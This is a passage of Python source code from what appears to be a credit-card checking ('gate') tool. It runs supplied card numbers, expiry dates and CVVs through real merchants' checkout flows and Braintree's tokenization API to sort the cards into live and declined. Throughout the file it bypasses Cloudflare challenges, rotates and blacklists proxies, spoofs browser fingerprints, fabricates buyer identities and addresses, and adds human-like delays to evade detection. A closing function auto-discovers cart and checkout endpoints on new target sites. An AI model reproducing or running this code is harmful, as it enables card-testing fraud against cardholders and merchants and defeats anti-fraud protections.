    proxy_fail_streak = 0
    site_key = _site_cooldown.get_site_key(site_url)

    cached_session = _site_session_cache.get(site_key)
    proven_proxy, proven_imp = _proven_proxies.get_proven_proxy(site_key)
    used_cache_this_run = False

    for attempt in range(max_retries):
        if attempt == 0 and cached_session and HAS_CURL_CFFI:
            imp = cached_session.get('impersonate') or proven_imp
            prx = cached_session.get('proxy_addr') or proven_proxy
            s, proxy_addr = _make_session(
                use_proxy=bool(prx), cf_bypass=True, cf_attempt=0, site_key=site_key,
                force_proxy_addr=prx, force_impersonate=imp
            )
            for ck, cv in cached_session.get('cookies', {}).items():
                s.cookies.set(ck, cv)
            used_cache_this_run = True
            logger.info(f"Braintree: attempt {attempt+1}/{max_retries} | CACHED session ({imp}) | proxy={'proven' if prx else 'direct'}")
        elif attempt == 0 and not cached_session:
            s, proxy_addr = _make_session(use_proxy=False, cf_bypass=HAS_CURL_CFFI, site_key=site_key)
            logger.info(f"Braintree: attempt {attempt+1}/{max_retries} | DIRECT first (no cache)")
        elif not cloudflare_detected and proven_proxy and HAS_CURL_CFFI:
            s, proxy_addr = _make_session(
                use_proxy=True, cf_bypass=True, cf_attempt=0, site_key=site_key,
                force_proxy_addr=proven_proxy, force_impersonate=proven_imp
            )
            logger.info(f"Braintree: attempt {attempt+1}/{max_retries} | PROVEN proxy ({proven_imp}) | {proven_proxy[:20]}")
        elif cloudflare_detected:
            if cf_attempt_counter < 5 and HAS_CURL_CFFI and is_proxy_enabled():
                s, proxy_addr = _make_session(use_proxy=True, cf_bypass=True, cf_attempt=cf_attempt_counter, site_key=site_key)
                cf_attempt_counter += 1
                logger.info(f"Braintree: attempt {attempt+1}/{max_retries} | curl_cffi CF bypass #{cf_attempt_counter} + fresh proxy")
            elif cf_attempt_counter == 5 and HAS_CLOUDSCRAPER:
                s, proxy_addr = _make_session(use_proxy=is_proxy_enabled(), force_cloudscraper=True)
                cf_attempt_counter += 1
                logger.info(f"Braintree: attempt {attempt+1}/{max_retries} | cloudscraper CF bypass | proxy={'yes' if proxy_addr else 'direct'}")
            elif HAS_CURL_CFFI:
                s, proxy_addr = _make_session(use_proxy=is_proxy_enabled(), cf_bypass=True, cf_attempt=cf_attempt_counter, site_key=site_key)
                cf_attempt_counter += 1
                logger.info(f"Braintree: attempt {attempt+1}/{max_retries} | curl_cffi CF bypass #{cf_attempt_counter} + rotate")
            else:
                s, proxy_addr = _make_session(use_proxy=True)
                cf_attempt_counter += 1
                logger.info(f"Braintree: attempt {attempt+1}/{max_retries} | proxy fallback")
        elif proxy_fail_streak >= 3:
            s, proxy_addr = _make_session(use_proxy=False, cf_bypass=HAS_CURL_CFFI, site_key=site_key)
            logger.info(f"Braintree: attempt {attempt+1}/{max_retries} | DIRECT (proxy streak {proxy_fail_streak})")
            proxy_fail_streak = 0
        else:
            use_proxy = is_proxy_enabled()
            s, proxy_addr = _make_session(use_proxy=use_proxy, cf_bypass=HAS_CURL_CFFI, site_key=site_key)
            logger.info(f"Braintree: attempt {attempt+1}/{max_retries} | {'curl_cffi' if HAS_CURL_CFFI else 'standard'} | proxy={'yes' if proxy_addr else 'direct'}")

        if proxy_addr:
            used_proxy = proxy_addr

        try:
            result = _do_braintree_check(s, cc, mes, ano, cvv, site_url, add_to_cart_path, checkout_path, product_payload, payment_method_id, country_code, fast_timeout=used_cache_this_run)

            detail_text = result.get("detail", "")

            if result.get("_cloudflare") and not cloudflare_detected:
                cloudflare_detected = True
                if used_cache_this_run:
                    _site_session_cache.invalidate(site_key)
                    cached_session = None
                    used_cache_this_run = False
                    logger.info("Braintree: CF detected - cached session expired, invalidated")
                else:
                    logger.info("Braintree: Cloudflare detected, switching to CF bypass mode")
                continue

            if result.get("_cloudflare") and cloudflare_detected:
                continue

            if _is_ban_signal(detail_text):
                _bt_rate_limiter.record_rate_limit()
                _site_cooldown.record_block(site_url)
                result["_retry"] = True

            if "blocked" in detail_text.lower() or "403" in detail_text:
                _site_cooldown.record_block(site_url)

            if result.get("_proxy_fail") and proxy_addr:
                blacklist_proxy(proxy_addr)
                proxy_fail_streak += 1
                if used_cache_this_run:
                    _site_session_cache.invalidate(site_key)
                    cached_session = None
                    used_cache_this_run = False
                    logger.warning(f"Braintree: Cached proxy {proxy_addr[:25]} dead, cache invalidated. Retrying fresh...")
                else:
                    logger.warning(f"Braintree: Proxy {proxy_addr[:25]} failed (streak {proxy_fail_streak}), blacklisted. Retrying...")
                continue

            if result.get("_retry") and attempt < max_retries - 1:
                last_error = result.get("detail", "Retry needed")
                if used_cache_this_run:
                    _site_session_cache.invalidate(site_key)
                    cached_session = None
                    used_cache_this_run = False
                    logger.info(f"Braintree: Cache invalidated on retry ({detail_text[:40]})")
                if proxy_addr:
                    blacklist_proxy(proxy_addr)
                    logger.info(f"Braintree: Blacklisted proxy {proxy_addr[:25]}, retrying")
                retry_delay(attempt, base_min=0.3, base_max=0.8)
                continue

            if result.get('status') not in ('error',):
                _bt_rate_limiter.record_success()
                proxy_fail_streak = 0
            elif used_cache_this_run:
                _site_session_cache.invalidate(site_key)
                cached_session = None
                used_cache_this_run = False
                logger.info(f"Braintree: Cache invalidated on error result")

            result['proxy_used'] = proxy_addr or "DIRECT"
            for k in list(result.keys()):
                if k.startswith('_'):
                    del result[k]
            return result
        except Exception as e:
            last_error = str(e)[:80]
            logger.error(f"Braintree attempt {attempt + 1} error: {last_error}")
            err_lower = last_error.lower()
            if any(sig in err_lower for sig in ["429", "too many", "rate limit"]):
                _bt_rate_limiter.record_rate_limit()
                _site_cooldown.record_block(site_url)
            elif any(sig in err_lower for sig in ["403", "forbidden", "blocked"]):
                _site_cooldown.record_block(site_url)
            if used_cache_this_run:
                _site_session_cache.invalidate(site_key)
                cached_session = None
                used_cache_this_run = False
                logger.info("Braintree: Exception on cached session, cache invalidated")
            if proxy_addr:
                blacklist_proxy(proxy_addr)
            if attempt < max_retries - 1:
                retry_delay(attempt, base_min=0.3, base_max=0.8)
        finally:
            try:
                s.close()
            except Exception:
                pass

    err = _error_result(cc, mes, ano, cvv, f"All retries failed: {last_error}")
    err['proxy_used'] = used_proxy or "DIRECT"
    return err


def _do_braintree_check(s, cc, mes, ano, cvv, site_url, add_to_cart_path, checkout_path, product_payload, payment_method_id="3", country_code="US", fast_timeout=False):
    _rate_wait()

    home_timeout = 6 if fast_timeout else 10
    try:
        home_res = s.get(site_url, timeout=home_timeout)
    except Exception as e:
        err_str = str(e)[:80]
        is_proxy_err = any(kw in err_str.lower() for kw in ['proxy', 'connectionpool', 'connect tunnel', 'httpsconnectionpool', 'proxyerror', 'tunnel connection', 'timeout', 'timed out', 'read timed out'])
        if is_proxy_err or _session_has_proxy(s):
            return {**_error_result(cc, mes, ano, cvv, f"Proxy failed: {err_str[:50]}"), "_proxy_fail": True}
        return {**_error_result(cc, mes, ano, cvv, f"Cannot reach site: {err_str[:50]}"), "_retry": True}

    logger.info(f"Braintree: Site response {home_res.status_code} | len={len(home_res.text)}")

    if home_res.status_code == 200:
        reading_delay(len(home_res.text))
        navigation_delay()
        site_key = _site_cooldown.get_site_key(site_url)
        impersonate = getattr(s, '_impersonate', None)
        proxy_used = None
        try:
            if hasattr(s, 'proxies') and s.proxies:
                px = s.proxies.get('http', '') or s.proxies.get('https', '')
                if px:
                    proxy_used = px.replace('http://', '').replace('https://', '')
        except Exception:
            pass
        try:
            try:
                cookies = {c.name: c.value for c in s.cookies}
            except Exception:
                cookies = dict(s.cookies) if s.cookies else {}
            cf_cookies = {k: v for k, v in cookies.items() if k.startswith('cf_') or k.startswith('__cf') or k == 'cf_clearance'}
            if cf_cookies:
                _cf_cache.save_cookies(site_key, cf_cookies, impersonate)
                logger.info(f"Braintree: CF bypass cookies cached for {site_key} ({impersonate or 'unknown'})")
            elif impersonate:
                _cf_cache.save_cookies(site_key, cookies, impersonate)
            if proxy_used:
                _proven_proxies.record_success(site_key, proxy_used, impersonate)
                logger.info(f"Braintree: Proven proxy recorded {proxy_used[:20]} ({impersonate})")
        except Exception as e:
            logger.debug(f"Cookie caching error: {e}")

    if home_res.status_code in (403, 503):
        snippet = home_res.text[:100].replace('\n', ' ').strip()
        logger.warning(f"Braintree: Site blocked {home_res.status_code} | {snippet}")
        is_cf = _is_cloudflare_challenge(home_res)
        if is_cf:
            logger.warning("Braintree: Cloudflare JS challenge detected on homepage")
            site_key = _site_cooldown.get_site_key(site_url)
            _cf_cache.invalidate(site_key)
            return {**_error_result(cc, mes, ano, cvv, f"Cloudflare challenge on site"), "_cloudflare": True, "_retry": True}
        return {**_error_result(cc, mes, ano, cvv, f"Site blocked: HTTP {home_res.status_code}"), "_proxy_fail": _session_has_proxy(s), "_retry": True}
    if home_res.status_code != 200:
        return {**_error_result(cc, mes, ano, cvv, f"Site HTTP {home_res.status_code}"), "_retry": True}

    csrf_token = ""
    csrf_patterns = [
        r'<meta\s+name="csrf-token"\s+content="([^"]+)"',
        r'csrf-token["\s]+content="([^"]+)"',
        r'content="([^"]+)"[^>]*name="csrf-token"',
        r'<meta\s+content="([^"]+)"\s+name="csrf-token"',
        r'"csrf[_-]?token"\s*:\s*"([^"]+)"',
        r"'csrf[_-]?token'\s*:\s*'([^']+)'",
        r'name="authenticity_token"\s+value="([^"]+)"',
        r'value="([^"]+)"\s+name="authenticity_token"',
        r'"authenticity_token"\s*:\s*"([^"]+)"',
    ]
    for csrf_pat in csrf_patterns:
        csrf_match = re.search(csrf_pat, home_res.text)
        if csrf_match:
            csrf_token = csrf_match.group(1)
            break

    if not csrf_token:
        logger.warning("Braintree: No CSRF token in homepage, checking cookies...")
        for cookie in s.cookies:
            if 'csrf' in cookie.name.lower() or 'token' in cookie.name.lower():
                csrf_token = cookie.value
                break

    if not csrf_token:
        return {**_error_result(cc, mes, ano, cvv, "No CSRF token found"), "_retry": True}

    logger.info(f"Braintree: CSRF token obtained ({len(csrf_token)} chars)")

    site_key_for_cache = _site_cooldown.get_site_key(site_url)
    try:
        try:
            all_cookies = {c.name: c.value for c in s.cookies}
        except Exception:
            all_cookies = dict(s.cookies) if s.cookies else {}
        imp_used = getattr(s, '_impersonate', None)
        prx_used = None
        try:
            if hasattr(s, 'proxies') and s.proxies:
                px = s.proxies.get('http', '') or s.proxies.get('https', '')
                if px:
                    prx_used = px.replace('http://', '').replace('https://', '')
        except Exception:
            pass
        _site_session_cache.save(site_key_for_cache, all_cookies, csrf_token, prx_used, imp_used)
        logger.info(f"Braintree: Session cached for {site_key_for_cache} (csrf+cookies+proxy={prx_used}, imp={imp_used})")
    except Exception as e:
        logger.warning(f"Braintree: Session cache save failed: {e}")

    checkout_flow_delay("browse_site")

    ajax_headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrf_token,
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }

    if not product_payload:
        cart_json = {"variant_id": 266672, "quantity": 1}
    else:
        try:
            cart_json = json.loads(product_payload) if isinstance(product_payload, str) else product_payload
        except Exception:
            cart_json = {"variant_id": 266672, "quantity": 1}

    try:
        cart_url = f"{site_url}{add_to_cart_path}"
        cart_res = s.post(cart_url, json=cart_json, headers=ajax_headers, timeout=10)
    except Exception as e:
        err_str = str(e)[:80]
        is_proxy_err = any(kw in err_str.lower() for kw in ['proxy', 'connectionpool', 'connect tunnel', 'proxyerror', 'tunnel connection', 'timeout', 'timed out'])
        if is_proxy_err or _session_has_proxy(s):
            return {**_error_result(cc, mes, ano, cvv, f"Cart proxy failed: {err_str[:50]}"), "_proxy_fail": True}
        return {**_error_result(cc, mes, ano, cvv, f"Cart add failed: {err_str[:50]}"), "_retry": True}

    logger.info(f"Braintree: Cart response {cart_res.status_code} | len={len(cart_res.text)}")

    if cart_res.status_code in (403, 503):
        if _is_cloudflare_challenge(cart_res):
            return {**_error_result(cc, mes, ano, cvv, "Cloudflare challenge on cart"), "_cloudflare": True, "_retry": True}
        return {**_error_result(cc, mes, ano, cvv, f"Cart blocked: HTTP {cart_res.status_code}"), "_proxy_fail": _session_has_proxy(s), "_retry": True}

    order_number = None
    order_token = None

    if cart_res.status_code in (200, 201):
        try:
            cart_data = cart_res.json()
            order_number = cart_data.get('orderNumber', '') or cart_data.get('order_number', '') or cart_data.get('number', '')
            order_token = cart_data.get('orderToken', '') or cart_data.get('order_token', '') or cart_data.get('token', '')
            if order_number:
                logger.info(f"Braintree: Cart gave order {order_number}")
        except Exception:
            pass

    dynamic_checkout_url = None
    if cart_res.status_code in (200, 201):
        try:
            cart_data = cart_res.json()
            checkout_url_path = cart_data.get('checkout_url', '') or cart_data.get('checkoutUrl', '')
            if checkout_url_path:
                if checkout_url_path.startswith('/'):
                    dynamic_checkout_url = f"{site_url}/api{checkout_url_path}"
                elif checkout_url_path.startswith('http'):
                    dynamic_checkout_url = checkout_url_path
                else:
                    dynamic_checkout_url = f"{site_url}/api/{checkout_url_path}"
                logger.info(f"Braintree: Dynamic checkout URL from cart: {dynamic_checkout_url[:80]}")
        except Exception:
            pass

    if not order_number or not order_token:
        if dynamic_checkout_url:
            url_match = re.search(r'checkouts/([A-Z0-9]+)', dynamic_checkout_url)
            if url_match:
                order_number = url_match.group(1)
            token_in_url = re.search(r'order_token=([^&]+)', dynamic_checkout_url)
            if token_in_url:
                order_token = token_in_url.group(1)

    if not order_number or not order_token:
        checkout_flow_delay("view_cart")
        between_requests_delay()
        try:
            checkout_url = f"{site_url}{checkout_path}"
            checkout_res = s.get(checkout_url, timeout=10)
        except Exception as e:
            err_str = str(e)[:80]
            is_proxy_err = any(kw in err_str.lower() for kw in ['proxy', 'connectionpool', 'proxyerror', 'tunnel', 'timeout', 'timed out'])
            if is_proxy_err or _session_has_proxy(s):
                return {**_error_result(cc, mes, ano, cvv, f"Checkout proxy failed: {err_str[:50]}"), "_proxy_fail": True}
            return {**_error_result(cc, mes, ano, cvv, f"Checkout page failed: {err_str[:50]}"), "_retry": True}

        logger.info(f"Braintree: Checkout page {checkout_res.status_code} | url={checkout_res.url[:80]}")

        order_patterns = [
            r'/api/checkouts/(R\d+)\?order_token=([^"&\s]+)',
            r'/api/checkouts/([A-Z0-9]+)\?order_token=([^"&\s]+)',
        ]
        for op in order_patterns:
            order_match = re.search(op, checkout_res.text)
            if order_match:
                order_number = order_match.group(1)
                order_token = order_match.group(2)
                break

        if not order_number or not order_token:
            order_match2 = re.search(r'"order_number"\s*:\s*"([^"]+)"', checkout_res.text)
            token_match2 = re.search(r'"token"\s*:\s*"([^"]+)"', checkout_res.text)
            if order_match2:
                order_number = order_match2.group(1)
            if token_match2:
                order_token = token_match2.group(1)

        if not order_number or not order_token:
            url_match = re.search(r'checkouts/([A-Z0-9]+)', checkout_res.url)
            if url_match:
                order_number = url_match.group(1)
            token_in_url = re.search(r'order_token=([^&]+)', checkout_res.url)
            if token_in_url:
                order_token = token_in_url.group(1)

        if not order_number or not order_token:
            num_match = re.search(r'"number"\s*:\s*"([^"]+)"', checkout_res.text)
            if num_match:
                order_number = num_match.group(1)

    checkout_api_url = dynamic_checkout_url
    if not checkout_api_url and order_number:
        if order_token:
            checkout_api_url = f"{site_url}/api/checkouts/{order_number}?order_token={order_token}"
        else:
            checkout_api_url = f"{site_url}/api/checkouts/{order_number}"

    if not checkout_api_url:
        logger.warning("Braintree: Cannot build checkout API URL")
        return {**_error_result(cc, mes, ano, cvv, "Cannot extract order/token"), "_retry": True}

    logger.info(f"Braintree: Checkout API URL ready | order={order_number or 'dynamic'}")

    checkout_flow_delay("fill_address")

    f_name = fake.first_name()
    l_name = fake.last_name()
    email = _rnd_email()
    addr = _random_address()

    address_data = {
        "state": "address",
        "order": {
            "email": email,
            "ship_address_attributes": {
                "firstname": f_name,
                "lastname": l_name,
                "address1": fake.street_address(),
                "address2": "",
                "city": addr["city"],
                "zipcode": addr["zip"],
                "phone": f"{addr['area']}{random.randint(1000000, 9999999)}",
                "state_name": addr["state"],
                "state_text": addr["state"],
                "country": "United States",
                "state_id": addr["state_id"],
                "country_id": 49,
                "country_code": "US"
            },
        }
    }

    try:
        addr_res = s.put(checkout_api_url, json=address_data, headers=ajax_headers, timeout=12)
    except Exception as e:
        err_str = str(e)[:80]
        is_proxy_err = any(kw in err_str.lower() for kw in ['proxy', 'connectionpool', 'proxyerror', 'tunnel', 'timeout', 'timed out'])
        if is_proxy_err or _session_has_proxy(s):
            return {**_error_result(cc, mes, ano, cvv, f"Address proxy failed: {err_str[:50]}"), "_proxy_fail": True}
        return {**_error_result(cc, mes, ano, cvv, f"Address submit failed: {err_str[:50]}"), "_retry": True}

    logger.info(f"Braintree: Address response {addr_res.status_code} | len={len(addr_res.text)}")

    if addr_res.status_code in (403, 503):
        if _is_cloudflare_challenge(addr_res):
            return {**_error_result(cc, mes, ano, cvv, "Cloudflare challenge on address"), "_cloudflare": True, "_retry": True}
        return {**_error_result(cc, mes, ano, cvv, f"Address blocked: HTTP {addr_res.status_code}"), "_proxy_fail": _session_has_proxy(s), "_retry": True}

    bt_token_raw = None
    try:
        addr_json = addr_res.json()
        bt_token_raw = addr_json.get('braintreeClientToken', '') or addr_json.get('braintree_client_token', '')
    except Exception:
        pass

    if not bt_token_raw:
        bt_token_raw = _extract_bt_token(addr_res.text)

    if not bt_token_raw:
        logger.info("Braintree: No BT token in address response, checking checkout page...")
        try:
            ck_url = f"{site_url}{checkout_path}"
            ck_res = s.get(ck_url, timeout=10)
            bt_token_raw = _extract_bt_token(ck_res.text)
            if bt_token_raw:
                logger.info("Braintree: Found BT token in checkout page")
        except Exception:
            pass

    if not bt_token_raw:
        return {**_error_result(cc, mes, ano, cvv, "No Braintree client token in response"), "_retry": True}

    try:
        if not bt_token_raw.endswith('='):
            bt_token_raw += '=' * (4 - len(bt_token_raw) % 4)
        decoded = base64.b64decode(bt_token_raw)
        bt_json = json.loads(decoded)
        auth_fingerprint = bt_json.get('authorizationFingerprint', '')
    except Exception as e:
        return {**_error_result(cc, mes, ano, cvv, f"BT token decode failed: {str(e)[:40]}"), "_retry": True}

    if not auth_fingerprint:
        return {**_error_result(cc, mes, ano, cvv, "No auth fingerprint in BT token"), "_retry": True}

    logger.info("Braintree: Auth fingerprint obtained")

    checkout_flow_delay("fill_payment")
    page_interaction_delay()

    gql_payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin",
            "sessionId": uuid.uuid4().hex
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mes,
                    "expirationYear": ano,
                    "cvv": cvv,
                    "billingAddress": {
                        "postalCode": addr["zip"],
                        "streetAddress": fake.street_address(),
                        "firstName": f_name,
                        "lastName": l_name,
                        "locality": addr["city"],
                        "region": addr["state"],
                        "countryCodeAlpha2": country_code or "US"
                    }
                },
                "options": {
                    "validate": False
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }

    fp = _get_fingerprint()
    gql_headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {auth_fingerprint}',
        'Braintree-Version': random.choice(_BRAINTREE_VERSIONS),
        'Origin': site_url,
        'Referer': f'{site_url}/',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'User-Agent': fp['ua'],
        'Sec-Ch-Ua': fp['sec_ch_ua'],
        'Sec-Ch-Ua-Mobile': fp.get('mobile', '?0'),
        'Sec-Ch-Ua-Platform': fp['platform'],
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
    }

    if not fp.get('sec_ch_ua'):
        gql_headers.pop('Sec-Ch-Ua', None)
        gql_headers.pop('Sec-Ch-Ua-Mobile', None)
        gql_headers.pop('Sec-Ch-Ua-Platform', None)

    try:
        gql_res = std_requests.post(
            'https://payments.braintree-api.com/graphql',
            json=gql_payload,
            headers=gql_headers,
            timeout=12,
            verify=False,
        )
    except Exception as e:
        err_str = str(e)[:80]
        return {**_error_result(cc, mes, ano, cvv, f"BT tokenize failed: {err_str[:50]}"), "_retry": True}

    logger.info(f"Braintree: GQL tokenize response {gql_res.status_code}")

    if gql_res.status_code == 403:
        snippet = gql_res.text[:200].lower()
        if 'cloudflare' in snippet or 'captcha' in snippet or 'challenge' in snippet:
            logger.warning("Braintree: GQL 403 - Cloudflare/captcha block")
            return {**_error_result(cc, mes, ano, cvv, "BT API blocked: Cloudflare/captcha"), "_proxy_fail": _session_has_proxy(s), "_retry": True}
        logger.warning(f"Braintree: GQL 403 - {gql_res.text[:150]}")
        return {**_error_result(cc, mes, ano, cvv, "BT API 403: auth fingerprint expired"), "_retry": True}
    if gql_res.status_code == 429:
        logger.warning("Braintree: GQL 429 rate limited")
        return {**_error_result(cc, mes, ano, cvv, "BT API rate limited"), "_retry": True}

    try:
        gql_data = gql_res.json()
    except Exception:
        logger.warning(f"Braintree: GQL invalid JSON: {gql_res.text[:150]}")
        return {**_error_result(cc, mes, ano, cvv, "BT tokenize: invalid JSON"), "_retry": True}

    nonce = None
    brand_code = ""
    last4 = ""
    try:
        tc = gql_data.get('data', {}).get('tokenizeCreditCard', {})
        nonce = tc.get('token', '')
        cc_info = tc.get('creditCard', {})
        brand_code = cc_info.get('brandCode', '')
        last4 = cc_info.get('last4', '')
    except Exception:
        pass

    if not nonce:
        errors = gql_data.get('errors', [])
        if errors:
            err_msg = errors[0].get('message', 'Unknown tokenize error')
            logger.warning(f"Braintree: Tokenize error: {err_msg}")
            err_lower = err_msg.lower()
            if 'postal code' in err_lower or 'zip' in err_lower:
                return {**_error_result(cc, mes, ano, cvv, f"Tokenize: {err_msg[:60]}"), "_retry": True}
            if 'credit card number' in err_lower or 'invalid' in err_lower:
                return {'status': 'declined', 'detail': f'{err_msg[:60]}', 'gate': 'Braintree', 'card': f"{cc}|{mes}|{ano}|{cvv}"}
            if 'cvv' in err_lower:
                return {'status': 'declined', 'detail': f'{err_msg[:60]}', 'gate': 'Braintree', 'card': f"{cc}|{mes}|{ano}|{cvv}"}
            if 'expir' in err_lower:
                return {'status': 'declined', 'detail': f'{err_msg[:60]}', 'gate': 'Braintree', 'card': f"{cc}|{mes}|{ano}|{cvv}"}
            return _error_result(cc, mes, ano, cvv, f"Tokenize error: {err_msg[:60]}")

        ext = gql_data.get('extensions', {})
        if ext:
            ext_errors = ext.get('requestErrors', {}).get('fieldErrors', [])
            if ext_errors:
                field_msg = ext_errors[0].get('message', 'Field validation failed')
                logger.warning(f"Braintree: Field error: {field_msg}")
                if 'postal' in field_msg.lower() or 'zip' in field_msg.lower():
                    return {**_error_result(cc, mes, ano, cvv, f"Tokenize: {field_msg[:60]}"), "_retry": True}
                return _error_result(cc, mes, ano, cvv, f"Tokenize: {field_msg[:60]}")

        logger.warning(f"Braintree: No nonce, GQL response: {json.dumps(gql_data)[:200]}")
        return {**_error_result(cc, mes, ano, cvv, "No nonce from Braintree"), "_retry": True}

    logger.info(f"Braintree: Nonce created | brand={brand_code or '?'} | last4={last4 or '?'}")

    pre_submit_delay()
    between_requests_delay()

    pmid = int(payment_method_id) if str(payment_method_id).isdigit() else payment_method_id

    device_session_id = str(time.time()).replace('.', '')
    device_data = json.dumps({
        "device_session_id": device_session_id,
        "fraud_merchant_id": None,
        "correlation_id": uuid.uuid4().hex
    })

    bill_address = {
        "firstname": f_name,
        "lastname": l_name,
        "address1": fake.street_address(),
        "address2": "",
        "city": addr["city"],
        "zipcode": addr["zip"],
        "phone": f"{addr['area']}{random.randint(1000000, 9999999)}",
        "state_name": None,
        "state_text": addr["state"],
        "state_id": addr["state_id"],
        "country_id": 49,
        "country_code": "US"
    }

    payment_data = {
        "state": "payment",
        "order": {
            "email": email,
            "bill_address_attributes": bill_address,
            "payments_attributes": [{
                "payment_method_id": pmid,
                "source_attributes": {
                    "name": f"{f_name} {l_name}",
                    "nonce": nonce,
                    "device_data": device_data,
                    "payment_type": "credit_card",
                    "address_attributes": bill_address.copy(),
                    "savable": True
                }
            }]
        }
    }

    try:
        pay_res = s.put(checkout_api_url, json=payment_data, headers=ajax_headers, timeout=15)
    except Exception as e:
        err_str = str(e)[:80]
        is_proxy_err = any(kw in err_str.lower() for kw in ['proxy', 'connectionpool', 'proxyerror', 'tunnel', 'timeout', 'timed out'])
        if is_proxy_err or _session_has_proxy(s):
            return {**_error_result(cc, mes, ano, cvv, f"Payment proxy failed: {err_str[:50]}"), "_proxy_fail": True}
        return {**_error_result(cc, mes, ano, cvv, f"Payment submit failed: {err_str[:50]}"), "_retry": True}

    logger.info(f"Braintree: Payment response {pay_res.status_code} | len={len(pay_res.text)}")

    try:
        pay_json = json.loads(pay_res.text)
        order_obj = pay_json.get('order', pay_json) if isinstance(pay_json, dict) else {}
        log_state = order_obj.get('state', '?')
        log_pstate = order_obj.get('payment_state', '?')
        log_step = pay_json.get('currentStep', '?') if isinstance(pay_json, dict) else '?'
        errors_brief = _extract_all_errors(pay_res.text, pay_json)
        errors_str = '; '.join(errors_brief[:3]) if errors_brief else 'none'
        code_m = re.search(r'"(?:processor_response_code|processorResponseCode|code)"\s*:\s*"?(\d{4,5})"?', pay_res.text)
        proc_code = code_m.group(1) if code_m else '?'
        logger.info(f"Braintree payment: state={log_state}, payment_state={log_pstate}, step={log_step}, code={proc_code}, errors=[{errors_str}]")
    except Exception:
        logger.info(f"Braintree payment raw: {pay_res.text[:200]}")

    return _parse_braintree_result(pay_res.text, cc, mes, ano, cvv, brand_code)


def setup_braintree_from_url(full_url):
    from config import set_gate_setting as _set_gs, get_all_gate_settings

    results = {
        "success": False,
        "site_url": "",
        "add_to_cart_path": "",
        "checkout_path": "",
        "payment_method_id": "",
        "bt_token_found": False,
        "errors": [],
        "auto_detected": [],
    }

    old_settings = get_all_gate_settings("braintree")

    full_url = full_url.strip()
    if not full_url.startswith("http"):
        full_url = f"https://{full_url}"

    parsed = urlparse(full_url)
    site_url = f"{parsed.scheme}://{parsed.netloc}"
    results["site_url"] = site_url

    s, _ = _make_session(use_proxy=False)
    new_settings = {}

    try:
        try:
            r = s.get(site_url, timeout=15, allow_redirects=True)
            if r.status_code != 200:
                results["errors"].append(f"Site returned HTTP {r.status_code}")
                return results
        except Exception as e:
            results["errors"].append(f"Cannot reach site: {str(e)[:60]}")
            return results

        results["auto_detected"].append(f"Site URL: {site_url}")
        new_settings["site_url"] = site_url
        home_html = r.text

        cart_patterns = [
            (r'action=["\']([^"\']*(?:cart|basket|orders)[^"\']*(?:add|populate|create)[^"\']*)["\']', "form action"),
            (r'["\']([/][^"\']*(?:orders/populate|cart/add|add.to.cart|basket/add)[^"\']*)["\']', "JS/link"),
            (r'["\']([/][^"\']*(?:populate|add_item|add_to_cart)[^"\']*)["\']', "endpoint"),
        ]
        cart_path = ""
        for pat, src in cart_patterns:
            m = re.search(pat, home_html, re.IGNORECASE)
            if m:
                cart_path = m.group(1)
                if not cart_path.startswith("/"):
                    cart_path = "/" + cart_path
                results["auto_detected"].append(f"Cart path: {cart_path} ({src})")
                break

        if not cart_path:
            common_carts = ["/orders/populate", "/cart/add", "/cart", "/basket/add"]
            for cp in common_carts:
                try:
                    test = s.get(f"{site_url}{cp}", timeout=8, allow_redirects=True)
                    if test.status_code in (200, 302, 405, 422):
                        cart_path = cp
                        results["auto_detected"].append(f"Cart path: {cp} (probed)")
                        break
                except Exception:
                    continue

        if cart_path:
            new_settings["add_to_cart_path"] = cart_path
        else:
            new_settings["add_to_cart_path"] = old_settings.get("add_to_cart_path", "/orders/populate")
            results["auto_detected"].append(f"Cart path: {new_settings['add_to_cart_path']} (default)")

        checkout_patterns = [
            (r'["\']([/][^"\']*(?:checkout/onepage|checkout|pay)[^"\']*)["\']', "JS/link"),
            (r'href=["\']([^"\']*checkout[^"\']*)["\']', "link"),
        ]
        checkout_path = ""
        for pat, src in checkout_patterns:
            m = re.search(pat, home_html, re.IGNORECASE)
            if m:
                found = m.group(1)
                if not found.startswith("/"):
                    found = "/" + found
                if "checkout" in found.lower():
                    checkout_path = found
                    results["auto_detected"].append(f"Checkout path: {checkout_path} ({src})")
                    break

        if not checkout_path:
            common_checkouts = ["/checkout/onepage", "/checkout", "/pay", "/payment"]
            for cp in common_checkouts:
                try:
                    test = s.get(f"{site_url}{cp}", timeout=8, allow_redirects=True)
                    if test.status_code in (200, 302):
                        checkout_path = cp
                        results["auto_detected"].append(f"Checkout path: {cp} (probed)")
                        break
                except Exception:
                    continue

        if checkout_path:
            new_settings["checkout_path"] = checkout_path
        else:
            new_settings["checkout_path"] = old_settings.get("checkout_path", "/checkout/onepage")
            results["auto_detected"].append(f"Checkout path: {new_settings['checkout_path']} (default)")

        bt_token = _extract_bt_token(home_html)
        if bt_token:
            results["bt_token_found"] = True
            results["auto_detected"].append("Braintree token: found in homepage")

        if not bt_token:
            check_pages = [checkout_path or "/checkout", "/checkout/onepage", "/payment"]
            for pg in check_pages:
                try:
                    pg_r = s.get(f"{site_url}{pg}", timeout=10, allow_redirects=True)
                    bt_token = _extract_bt_token(pg_r.text)
                    if bt_token:
                        results["bt_token_found"] = True
                        results["auto_detected"].append(f"Braintree token: found at {pg}")
                        break
                except Exception:
                    continue

        pm_patterns = [
            r'"payment_method_id"\s*:\s*"?(\d+)"?',
            r'payment_method_id["\s:]+(\d+)',
            r'"paymentMethodId"\s*:\s*"?(\d+)"?',
        ]
        pm_id = ""
        for pat in pm_patterns:
            m = re.search(pat, home_html)
            if m:
                pm_id = m.group(1)
                results["auto_detected"].append(f"Payment method ID: {pm_id}")
